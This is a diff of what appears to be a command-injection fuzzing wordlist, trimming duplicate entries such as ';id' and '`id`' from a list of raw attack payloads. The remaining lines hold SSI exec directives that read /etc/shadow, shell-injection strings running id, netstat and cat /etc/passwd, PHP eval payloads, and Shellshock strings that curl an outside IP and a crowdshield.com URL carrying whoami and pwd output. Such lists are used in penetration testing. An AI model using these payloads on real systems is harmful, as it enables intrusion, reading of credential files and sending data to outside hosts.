@@ -2,9 +2,6 @@
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-/index.html|id|
-;id;
-;id
 ;netstat -a;
 ;system('cat%20/etc/passwd')
 ;id;
@@ -15,7 +12,6 @@
 ||/usr/bin/id|
 |id;
 ||/usr/bin/id;
-;id|
 ;|/usr/bin/id|
 \n/bin/ls -al\n
 \n/usr/bin/id\n
@@ -37,9 +33,7 @@ a;id;
 a);id|
 a;id|
 a)|id
-a|id
 a)|id;
-a|id
 |/bin/ls -al
 a);/usr/bin/id
 a;/usr/bin/id
@@ -67,7 +61,6 @@ a|/usr/bin/id
 & id
 ; id
 %0a id %0a
-`id`
 $;/usr/bin/id
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
@@ -110,10 +103,6 @@ system('cat /etc/passwd');
 %20{${phpinfo()}}
 %20{${sleep(20)}}
 %20{${sleep(3)}}
-a|id|
-a;id|
-a;id;
-a;id\n
 () { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
 | curl http://crowdshield.com/.testing/rce.txt
 & curl http://crowdshield.com/.testing/rce.txt
@@ -188,15 +177,6 @@ exec('sleep 5');
 exec('whoami')
 exec('whoami');
 ;{$_GET["cmd"]}
-`id`
-|id
-| id
-;id
-;id|
-;id;
-& id
-&&id
-;id\n
 ifconfig
 | ifconfig
 ; ifconfig
